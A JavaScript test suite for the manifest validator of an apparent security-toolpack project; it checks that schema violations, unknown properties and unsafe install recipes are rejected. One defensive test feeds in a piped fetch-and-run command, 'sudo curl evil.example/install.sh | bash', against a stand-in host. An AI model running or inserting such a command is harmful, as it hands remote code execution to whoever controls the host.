import { describe, test } from 'node:test';
import assert from 'node:assert';
import fs from 'node:fs';
import path from 'node:path';
import { fileURLToPath } from 'node:url';

import { validateManifest, getManifestSchema } from './manifest-validator.js';

const HERE = path.dirname(fileURLToPath(import.meta.url));
const FIXTURES_DIR = path.join(HERE, 'fixtures');

function loadFixture(id) {
  const file = path.join(FIXTURES_DIR, `${id}.manifest.json`);
  return JSON.parse(fs.readFileSync(file, 'utf8'));
}

function clone(value) {
  return JSON.parse(JSON.stringify(value));
}

const BUILTIN_IDS = [
  'passive-osint',
  'web-recon',
  'network-discovery',
  'web-vuln-assessment',
  'offline-password-audit',
  'credentialed-service-audit',
  'reporting',
];

describe('toolpack manifest schema (toolpack.phantom.dev/v1)', () => {
  test('schema is loadable and identifies as v1', () => {
    const schema = getManifestSchema();
    assert.strictEqual(schema.$id, 'https://phantom.dev/schemas/toolpack.phantom.dev/v1.json');
    assert.strictEqual(schema.properties.schema.const, 'toolpack.phantom.dev/v1');
  });

  test('accepts a valid v1 manifest', () => {
    const manifest = loadFixture('reporting');
    const result = validateManifest(manifest);
    assert.deepStrictEqual(result.errors, []);
    assert.strictEqual(result.ok, true);
  });

  test('rejects an unknown schema version', () => {
    const manifest = loadFixture('reporting');
    manifest.schema = 'toolpack.phantom.dev/v2';
    const result = validateManifest(manifest);
    assert.strictEqual(result.ok, false);
    assert.ok(
      result.errors.some(err => err.schemaPath.includes('schema/const')),
      `expected a schema/const error, got: ${JSON.stringify(result.errors)}`,
    );
  });

  test('rejects an unknown action class', () => {
    const manifest = loadFixture('reporting');
    manifest.risk.action_classes = ['recon', 'totally-made-up-action'];
    const result = validateManifest(manifest);
    assert.strictEqual(result.ok, false);
    assert.ok(
      result.errors.some(err => err.message.includes('totally-made-up-action') || err.schemaPath.includes('actionClass')),
      `expected an unknown action class error, got: ${JSON.stringify(result.errors)}`,
    );
  });

  test('rejects an unknown risk class on a tool', () => {
    const manifest = loadFixture('reporting');
    manifest.tools[0].risk_class = 'wildcard-risk';
    const result = validateManifest(manifest);
    assert.strictEqual(result.ok, false);
    assert.ok(
      result.errors.some(err => err.message.includes('wildcard-risk') || err.schemaPath.includes('riskClass')),
      `expected an unknown risk class error, got: ${JSON.stringify(result.errors)}`,
    );
  });

  test('rejects shell-string install recipes', () => {
    const manifest = loadFixture('reporting');
    manifest.install.recipes.push({ kind: 'apt', shell: 'sudo curl evil.example/install.sh | bash' });
    const result = validateManifest(manifest);
    assert.strictEqual(result.ok, false);
    assert.ok(
      result.errors.some(err => err.schemaPath.includes('not') || err.schemaPath.includes('additionalProperties')),
      `expected a shell-string rejection, got: ${JSON.stringify(result.errors)}`,
    );
  });

  test('rejects script-string install recipes', () => {
    const manifest = loadFixture('reporting');
    manifest.install.recipes.push({ kind: 'apt', script: 'echo do something bad' });
    const result = validateManifest(manifest);
    assert.strictEqual(result.ok, false);
    assert.ok(
      result.errors.some(err => err.schemaPath.includes('not') || err.schemaPath.includes('additionalProperties')),
      `expected a script-string rejection, got: ${JSON.stringify(result.errors)}`,
    );
  });

  test('rejects a manifest missing trust.digest', () => {
    const manifest = loadFixture('reporting');
    delete manifest.trust.digest;
    const result = validateManifest(manifest);
    assert.strictEqual(result.ok, false);
    assert.ok(
      result.errors.some(err => err.message.includes('digest') && err.schemaPath.includes('required')),
      `expected a missing-digest error, got: ${JSON.stringify(result.errors)}`,
    );
  });

  test('rejects a manifest with empty risk.action_classes', () => {
    const manifest = loadFixture('reporting');
    manifest.risk.action_classes = [];
    const result = validateManifest(manifest);
    assert.strictEqual(result.ok, false);
    assert.ok(
      result.errors.some(err => err.schemaPath.includes('action_classes') && err.schemaPath.includes('minItems')),
      `expected minItems error on action_classes, got: ${JSON.stringify(result.errors)}`,
    );
  });

  test('rejects a manifest missing risk.action_classes entirely', () => {
    const manifest = loadFixture('reporting');
    delete manifest.risk.action_classes;
    const result = validateManifest(manifest);
    assert.strictEqual(result.ok, false);
    assert.ok(
      result.errors.some(err => err.message.includes('action_classes') && err.schemaPath.includes('required')),
      `expected required error on action_classes, got: ${JSON.stringify(result.errors)}`,
    );
  });

  test('rejects manifest with a bogus trust.digest format', () => {
    const manifest = loadFixture('reporting');
    manifest.trust.digest = 'not-a-sha256';
    const result = validateManifest(manifest);
    assert.strictEqual(result.ok, false);
    assert.ok(
      result.errors.some(err => err.schemaPath.includes('pattern')),
      `expected a pattern violation on trust.digest, got: ${JSON.stringify(result.errors)}`,
    );
  });

  test('rejects unknown top-level properties', () => {
    const manifest = loadFixture('reporting');
    const tampered = clone(manifest);
    tampered.evil = { payload: 'rce' };
    const result = validateManifest(tampered);
    assert.strictEqual(result.ok, false);
    assert.ok(
      result.errors.some(err => err.message.includes('unknown property "evil"')),
      `expected unknown-property rejection, got: ${JSON.stringify(result.errors)}`,
    );
  });

  test('rejects non-object input', () => {
    const result = validateManifest(null);
    assert.strictEqual(result.ok, false);
    assert.ok(result.errors.length >= 1);
  });

  for (const id of BUILTIN_IDS) {
    test(`built-in fixture validates: ${id}`, () => {
      const manifest = loadFixture(id);
      const result = validateManifest(manifest);
      assert.deepStrictEqual(
        result.errors,
        [],
        `expected ${id} fixture to validate; errors: ${JSON.stringify(result.errors, null, 2)}`,
      );
      assert.strictEqual(result.ok, true);
      // Sanity: fixture id matches filename.
      assert.strictEqual(manifest.identity.id, id);
    });
  }
});
